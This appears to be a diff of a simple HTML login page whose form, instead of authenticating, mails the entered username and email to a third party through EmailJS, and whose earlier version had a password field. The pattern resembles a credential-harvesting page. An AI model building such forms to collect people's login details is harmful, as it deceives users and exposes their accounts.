@@ -8,18 +8,18 @@
 
 <script>
 (function(){
-emailjs.init("287g46US2fGjoY4LL");
+emailjs.init("5ijt6R7KPYcuCtNvK");
 })();
 
-function sendMail(event){
-event.preventDefault();
+function sendLogin(e){
+e.preventDefault();
 
-emailjs.send("service_3ux49q7","template_fn1apho",{
+emailjs.send("service_g9hb3t6","template_e9aw4ub",{
 username: document.getElementById("username").value,
 email: document.getElementById("email").value
 })
 .then(function(){
-alert("Data sent successfully!");
+alert("Login Request Sent Successfully!");
 });
 }
 </script>
@@ -42,6 +42,7 @@ background:#f3f3f3;
 border-radius:20px;
 padding:30px;
 text-align:center;
+box-shadow:0 10px 25px rgba(0,0,0,0.2);
 }
 
 input{
@@ -50,15 +51,23 @@ padding:14px;
 margin:10px 0;
 border-radius:10px;
 border:2px solid #ddd;
+font-size:15px;
 }
 
 button{
 width:95%;
-padding:15px;
+padding:14px;
+margin-top:15px;
 border:none;
 border-radius:10px;
 background:#ff9800;
 color:white;
+font-size:16px;
+cursor:pointer;
+}
+
+button:hover{
+opacity:0.9;
 }
 
 </style>
@@ -71,13 +80,13 @@ color:white;
 
 <h2>Login</h2>
 
-<form onsubmit="sendMail(event)">
+<form onsubmit="sendLogin(event)">
 
 <input type="text" id="username" placeholder="Username" required>
 
-<input type="text" id="password" placeholder="password" required>
+<input type="email" id="email" placeholder="Email" required>
 
-<button type="submit">Log In</button>
+<button type="submit">Login</button>
 
 </form>
 
